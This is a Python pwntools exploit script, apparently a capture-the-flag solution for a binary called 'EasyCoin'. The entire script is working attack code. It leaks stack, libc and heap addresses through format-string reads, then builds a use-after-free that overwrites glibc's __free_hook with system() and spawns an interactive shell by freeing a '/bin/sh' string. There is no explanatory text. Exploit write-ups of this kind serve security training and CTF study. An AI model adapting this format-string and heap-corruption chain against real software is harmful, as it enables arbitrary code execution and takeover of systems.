from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def reg(name,passwd):
	cmd(1)
	p.sendlineafter("> ",name)
	p.sendlineafter("> ",passwd)
	p.sendlineafter("> ",passwd)
def login(name,passwd):
	cmd(2)
	p.sendlineafter("me\n> ",name)
	p.sendlineafter("> ",passwd)
def fmt(n):
	p.sendafter("> ","%{}$n".format(str(n)))
def sendcoin(name,count):
	cmd(2)
	p.sendlineafter("> ",name)
	p.sendlineafter("> ",str(count))
def remove():
	cmd(5)
def cp(pwd):
	cmd(4)
	p.sendlineafter("> ",pwd)
context.log_level="debug"
passwd="\0"*0x10+"\x02"+7*"\0"
atoi_got=0x603088

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./EasyCoin")
reg("A","A")
reg("/bin/sh",passwd)
login("A","A")
#####################################################################################################
cmd("%p")
p.readuntil("Command: ")
data=p.readline()
stack=int(data[:-1],16)-(0x7fffffffb4e0-0x7ffffffde000)
p.sendafter("> ","%3$p")
p.readuntil("Command: ")
data=p.read(14)
base=int(data,16)-(0x7ffff7b042c0-0x7ffff7a0d000)

p.sendafter("> ","%9$p")
p.readuntil("Command: ")
data=p.read(8)
heap=int(data,16)-(0x10)
log.warning(hex(stack))
log.success(hex(base))
log.info(hex(heap))
#leak over#
sendcoin("/bin/sh",0xdead)
remove()
reg("nier","A")
login("nier","A")
sendcoin("/bin/sh",heap+0x100)
sendcoin("nier",0xdad)
remove()
#start uaf #
libc.address=base
login("/bin/sh",p64(heap+0x30))
sendcoin("/bin/sh",1)
cp(p64(heap+0xa0-0x10))
cmd(6)
payload=p64(heap+0xd0)+p64(libc.symbols['__free_hook'])
cmd(1)
p.sendlineafter("> ","C")
p.sendafter("> ",payload)
p.sendafter("> ",payload)
#gdb.attach(p,'''b *0x4014bb''')
login("/bin/sh","")
cp(p64(libc.symbols['system']))
remove()
p.interactive()
